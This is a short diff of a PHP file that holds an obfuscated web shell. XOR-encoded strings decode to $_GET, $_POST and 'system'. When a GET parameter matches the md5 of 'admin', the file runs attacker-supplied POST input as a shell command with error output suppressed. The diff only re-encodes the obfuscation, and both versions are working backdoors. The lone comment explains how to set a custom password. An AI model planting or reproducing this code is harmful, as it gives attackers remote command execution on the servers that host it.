@@ -1,11 +1,11 @@
 
 <?php
-$a = ${"j!-%"^"5fhq"}[1];
-$b = ${"o {{-"^"0p4(y"}[2];
+$a = ${"p>)<"^"/ylh"}[1];
+$b = ${"h+%/-"^"7{j|y"}[2];
 //  1 is md5('admin'). You can have on your own.
 if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
 {
-    $t = ")[=$</"^"Z"NPYB";
+    $t = "@@@]=)"^"393)XD";
     @${'t'}($b);
   
 }
